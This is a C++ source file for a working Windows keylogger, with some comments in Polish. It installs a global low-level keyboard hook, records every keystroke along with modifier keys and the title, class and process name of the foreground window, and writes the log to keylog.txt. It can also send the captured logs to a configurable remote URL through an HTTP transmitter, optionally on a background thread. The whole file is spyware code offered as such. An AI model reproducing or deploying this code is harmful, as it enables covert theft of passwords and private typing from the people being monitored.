#include <iostream>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <mutex>
#include "transmiter_http.h"
#include "keylogger.h"
#include "log_node.h"

Keylogger::Keylogger() : transmiter_http_(log_nodes_, active_log_node, nodes_mutex_)
{
    this->keys_buffer_.reserve(sizeof(std::pair<int, int>) * 100);
}

Keylogger::~Keylogger()
{
    this->remove_hook();
}

Keylogger& Keylogger::get_instance()
{
	static Keylogger instance;
	return instance;
}

bool Keylogger::set_hook()
{
	this->keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger::keyboard_proc_, NULL, 0);
	return (this->keyboardHook != NULL);
}

bool Keylogger::remove_hook()
{
	if (this->keyboardHook)
	{
		UnhookWindowsHookEx(this->keyboardHook);
		this->keyboardHook = NULL;
		return true;
	}
	return false;
}


bool Keylogger::start(bool transmit, bool in_background, bool save_to_file)
{
    
    if (this->listening_) return false;
    this->listening_ = true;

    if(transmit) this->transmiter_http_.start();
    if (save_to_file) this->log_file_= std::ofstream("keylog.txt", std::ios::out);

    //processing worker
    process_worker_ = std::thread(&Keylogger::listen_, this);

    //parrarel
    if (in_background) {
        background_worker_ = std::thread(&Keylogger::dispatch_message_, this);
        return true;
    }

    //sequential
    this->dispatch_message_();
    this->stop();
    return true;
}

bool Keylogger::stop() {
    if (!this->listening_) return false;
    this->listening_ = false;

    if (process_worker_.joinable()) {
        process_worker_.join();
    }

    if (background_worker_.joinable()) {
        DWORD thread_id = GetThreadId(background_worker_.native_handle());
        PostThreadMessage(thread_id, WM_QUIT, 0, 0);
        background_worker_.join();
    }
    else PostQuitMessage(0);
    if (this->log_file_.is_open()) this->log_file_.close();
    
    transmiter_http_.stop();
    return true;
}

bool Keylogger::set_transmiter_conf(std::string url, int retries, int frequency)
{
    this->transmiter_http_.set_conf(url, retries, frequency);
    return true;
}


void Keylogger::listen_()
{

    while (this->listening_) {
        std::vector<std::pair<int, int>> temp_buff;
        {
            std::lock_guard<std::mutex> lock(this->keys_buffer_mutex_);
            this->keys_buffer_.swap(temp_buff);
        }
        while (!temp_buff.empty()) {
            const auto [vk, wm_mode] = temp_buff.back();
            temp_buff.pop_back();
            this->log_key_(vk, wm_mode);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }
}

void Keylogger::dispatch_message_()
{   
    this->set_hook();

    SetThreadDescription(GetCurrentThread(), L"logger");
    while (GetMessage(&this->msg, NULL, 0, 0) && this->listening_)
    {
        TranslateMessage(&this->msg);
        DispatchMessage(&this->msg);
    }

    this->remove_hook();
}


LRESULT Keylogger::keyboard_proc_(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyboard->vkCode;
        Keylogger& logger = Keylogger::get_instance();
        std::mutex& mtx = logger.keys_buffer_mutex_;
        {
            std::lock_guard<std::mutex> lock(mtx);
            logger.keys_buffer_.push_back(
                std::pair<int, int>(key, static_cast<int>(wParam))
            );
        }
        
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


void Keylogger::log_key_(int vk_code, int wm_mode)
{
    
    std::string key = this->procces_key_(vk_code, wm_mode);
    if (key == "") return;
    std::string time = this->get_current_time_();
    WindowInfo window_info = this->get_active_window_info_();

    {
        std::lock_guard<std::mutex> lock(this->nodes_mutex_);
        LogNode* activ_obs;
        
        activ_obs = this->pick_log_(window_info, time);
        //activ_obs->keystrokes += key + this->k_delimiter;
        activ_obs->keystrokes += key;
        if (*activ_obs != active_log_node) change_active_node(activ_obs);
    }

    if (this->log_file_.is_open())
        this->log_file_ << key << std::flush;
}

LogNode* Keylogger::pick_log_(WindowInfo window_info, std::string time)
{

    bool found = false;
    for (auto& log : log_nodes_) {
        if (window_info == log->window_info && time == log->time) {
            return log.get();
        }
    }

    return this->add_log(window_info, time);

}

LogNode* Keylogger::add_log(WindowInfo window_info, std::string time)
{
    std::unique_ptr<LogNode> new_node = std::make_unique<LogNode>(window_info, time);
    LogNode* observer_ptr = new_node.get();
    this->log_nodes_.push_back(std::move(new_node));
    return observer_ptr;
}


WindowInfo Keylogger::get_active_window_info_()
{
    std::string fallback = "[SYSTEM/DESKTOP]";

    std::string w_title;
    std::string process_name;
    std::string w_class;

    
    HWND wh = GetForegroundWindow();
    if (this->active_window_handle_ != nullptr && wh != nullptr &&
        wh == this->active_window_handle_) 
    {
        w_title = this->get_active_window_title(fallback);
        {
            std::lock_guard<std::mutex> lock(this->nodes_mutex_);

            if (w_title == this->active_log_node.window_info.title)
                return this->active_log_node.window_info;
        }
        
    }

    if (wh != nullptr) {
        this->active_window_handle_ = wh;

        process_name = this->get_active_window_procces_name(fallback);
        if(w_title == "") w_title = this->get_active_window_title(fallback);
        w_class = this->get_active_window_class(fallback);        
        
    }
    else w_title = w_class = process_name = fallback;
        

    return WindowInfo(w_title, process_name, w_class);
}

std::string Keylogger::convert_to_utf8(wchar_t* data)
{
    if (data == nullptr || data[0] == L'\0') {
        return std::string();
    }

    int size_needed = WideCharToMultiByte(CP_UTF8, 0, data, -1, NULL, 0, NULL, NULL);

    if (size_needed <= 0) {
        return std::string();
    }

    std::string result(size_needed - 1, 0); // -1 bo nie chcemy null terminatora
    WideCharToMultiByte(CP_UTF8, 0, data, -1, &result[0], size_needed, NULL, NULL);

    return result;
}

std::string Keylogger::get_active_window_title(std::string fallback)
{
    HWND wh = this->active_window_handle_;
    std::string w_title;

    wchar_t title_buffer[256] = { 0 };
    int tittle_len = GetWindowTextW(wh, title_buffer, sizeof(title_buffer));
    if (tittle_len == 0) w_title = "[UNTITLED]";
    else w_title = convert_to_utf8(title_buffer);

    return w_title;
}

std::string Keylogger::get_active_window_class(std::string fallback)
{

    HWND wh = this->active_window_handle_;
    std::string w_class;

    wchar_t class_name_buffer[256] = { 0 };
    int class_len = GetClassNameW(wh, class_name_buffer, sizeof(class_name_buffer));
    if (class_len == 0) w_class = "[UNTITLED]";
    else w_class = convert_to_utf8(class_name_buffer);

    return w_class;
}

std::string Keylogger::get_active_window_procces_name(std::string fallback)
{

    HWND wh = this->active_window_handle_;
    std::string process_name;

    DWORD procces_id = 0;
    GetWindowThreadProcessId(wh, &procces_id);

    if (procces_id != 0) {
        HANDLE h_process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, procces_id);
        if (h_process != NULL) {

            DWORD process_path_size_ = _MAX_PATH;
            wchar_t procces_path[_MAX_PATH] = { 0 };

            if (QueryFullProcessImageNameW(h_process, 0, procces_path, &process_path_size_)) {
                wchar_t* filename = wcsrchr(procces_path, '\\')+1;
                if (filename != nullptr) process_name = convert_to_utf8(filename);
                else process_name = convert_to_utf8(procces_path);
            }
            else process_name = "[PID:" + std::to_string(procces_id) + "]";

            CloseHandle(h_process);
        }
        else process_name = "[PID:" + std::to_string(procces_id) + "]";

    }
    else process_name = fallback;
    return process_name;
}

std::string Keylogger::get_current_time_()
{
    std::int64_t now = static_cast<std::int64_t>(std::time(nullptr));
    now = (now / 60) * 60;
    return std::to_string(now);
}




void Keylogger::change_active_node(LogNode* node)
{
    this->active_log_node.window_info = node->window_info;
    this->active_log_node.time = node->time;

    if (this->log_file_.is_open()) {
        this->log_file_ << "\n" + std::string(10, '=') << std::endl;

        this->log_file_ << "Window title: " << node->window_info.title << std::endl;
        this->log_file_ << "Window class: " << node->window_info.class_name << std::endl;
        this->log_file_ << "Window process name: " << node->window_info.process << std::endl;
        this->log_file_ << ' ' + node->time;
        this->log_file_ << std::string(10, '=') + "\n" << std::flush;
    }
}



std::string Keylogger::procces_key_(int vk_code, int wm_mode)
{
    if (wm_mode == WM_KEYUP || wm_mode == WM_SYSKEYUP) this->update_modifiers_keys_(vk_code, false);
    else if (wm_mode == WM_KEYDOWN || wm_mode == WM_SYSKEYDOWN) {
        if (this->update_modifiers_keys_(vk_code, true)) return "";

        std::string output = "";
        if (this->sys_key_state & 4) output += "[CTRL+";
        if (this->sys_key_state & 2 && this->sys_key_state != 2) output += "[SHIFT+";
        if (this->sys_key_state & 1) output += "[ALT+"; 
        output += this->vk_to_string_(vk_code);
        if (this->sys_key_state && this->sys_key_state != 2) output += "]";
        return output;
    }
    return "";
}


bool Keylogger::update_modifiers_keys_(int vk_code, bool pressed)
{
    switch (vk_code) {
        case VK_LCONTROL:
        case VK_RCONTROL:
        case VK_CONTROL:
            if (pressed) this->sys_key_state |= 4;
            else this->sys_key_state &= ~4;
            return true;
        case VK_LSHIFT:
        case VK_RSHIFT:
        case VK_SHIFT:
            if (pressed) this->sys_key_state |= 2;
            else this->sys_key_state &= ~2;
            return true;
        case VK_LMENU:
        case VK_RMENU:
        case VK_MENU:
            if (pressed) this->sys_key_state |= 1;
            else this->sys_key_state &= ~1;
            return true;
        default:
            return false;
    }
}


std::string Keylogger::vk_to_string_(int vk_code)
{
    switch (vk_code)
    {
        // ===== Specjalne klawisze =====
    case VK_BACK:       return "[BACKSPACE]";
    case VK_RETURN:     return "[ENTER]";
    case VK_SPACE:      return " ";
    case VK_TAB:        return "[TAB]";
    case VK_ESCAPE:     return "[ESC]";
    case VK_CAPITAL:    return "[CAPSLOCK]";
    case VK_DELETE:     return "[DELETE]";
    case VK_INSERT:     return "[INSERT]";
    case VK_HOME:       return "[HOME]";
    case VK_END:        return "[END]";
    case VK_PRIOR:      return "[PAGEUP]";
    case VK_NEXT:       return "[PAGEDOWN]";
    case VK_SNAPSHOT:   return "[PRINTSCREEN]";
    case VK_SCROLL:     return "[SCROLLLOCK]";
    case VK_PAUSE:      return "[PAUSE]";

        // ===== Strza�ki =====
    case VK_LEFT:       return "[LEFT]";
    case VK_RIGHT:      return "[RIGHT]";
    case VK_UP:         return "[UP]";
    case VK_DOWN:       return "[DOWN]";

    // ===== Klawisze funkcyjne =====
    case VK_F1:         return "[F1]";
    case VK_F2:         return "[F2]";
    case VK_F3:         return "[F3]";
    case VK_F4:         return "[F4]";
    case VK_F5:         return "[F5]";
    case VK_F6:         return "[F6]";
    case VK_F7:         return "[F7]";
    case VK_F8:         return "[F8]";
    case VK_F9:         return "[F9]";
    case VK_F10:        return "[F10]";
    case VK_F11:        return "[F11]";
    case VK_F12:        return "[F12]";


        // ===== Numpad =====
    case VK_NUMPAD0:    return "[NUM0]";
    case VK_NUMPAD1:    return "[NUM1]";
    case VK_NUMPAD2:    return "[NUM2]";
    case VK_NUMPAD3:    return "[NUM3]";
    case VK_NUMPAD4:    return "[NUM4]";
    case VK_NUMPAD5:    return "[NUM5]";
    case VK_NUMPAD6:    return "[NUM6]";
    case VK_NUMPAD7:    return "[NUM7]";
    case VK_NUMPAD8:    return "[NUM8]";
    case VK_NUMPAD9:    return "[NUM9]";
    case VK_MULTIPLY:   return "[NUM*]";
    case VK_ADD:        return "[NUM+]";
    case VK_SEPARATOR:  return "[NUM_SEPARATOR]";
    case VK_SUBTRACT:   return "[NUM-]";
    case VK_DECIMAL:    return "[NUM.]";
    case VK_DIVIDE:     return "[NUM/]";
    case VK_NUMLOCK:    return "[NUMLOCK]";

        // ===== Cyfry 0-9  =====
    case '0':           return (sys_key_state & 2) ? ")" : "0";
    case '1':           return (sys_key_state & 2) ? "!" : "1";
    case '2':           return (sys_key_state & 2) ? "@" : "2";
    case '3':           return (sys_key_state & 2) ? "#" : "3";
    case '4':           return (sys_key_state & 2) ? "$" : "4";
    case '5':           return (sys_key_state & 2) ? "%" : "5";
    case '6':           return (sys_key_state & 2) ? "^" : "6";
    case '7':           return (sys_key_state & 2) ? "&" : "7";
    case '8':           return (sys_key_state & 2) ? "*" : "8";
    case '9':           return (sys_key_state & 2) ? "(" : "9";

    // ===== Znaki specjalne =====
    case VK_OEM_1:      return (sys_key_state & 2) ? ":" : ";";
    case VK_OEM_PLUS:   return (sys_key_state & 2) ? "+" : "=";
    case VK_OEM_COMMA:  return (sys_key_state & 2) ? "<" : ",";
    case VK_OEM_MINUS:  return (sys_key_state & 2) ? "_" : "-";
    case VK_OEM_PERIOD: return (sys_key_state & 2) ? ">" : ".";
    case VK_OEM_2:      return (sys_key_state & 2) ? "?" : "/";
    case VK_OEM_3:      return (sys_key_state & 2) ? "~" : "`";
    case VK_OEM_4:      return (sys_key_state & 2) ? "{" : "[";
    case VK_OEM_5:      return (sys_key_state & 2) ? "|" : "\\";
    case VK_OEM_6:      return (sys_key_state & 2) ? "}" : "]";
    case VK_OEM_7:      return (sys_key_state & 2) ? "\"" : "'";

    default:
        if (vk_code >= 'A' && vk_code <= 'Z')
        {
            char letter = static_cast<char>(vk_code);

            bool caps_on = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            bool make_upper = ((sys_key_state & 2)) ^ caps_on; 

            if (!make_upper) letter = letter + 32;

            return std::string(1, letter);
        }

        // Nieznany klawisz
        return "[UNKNOWN:" + std::to_string(vk_code) + "]";
    }
}

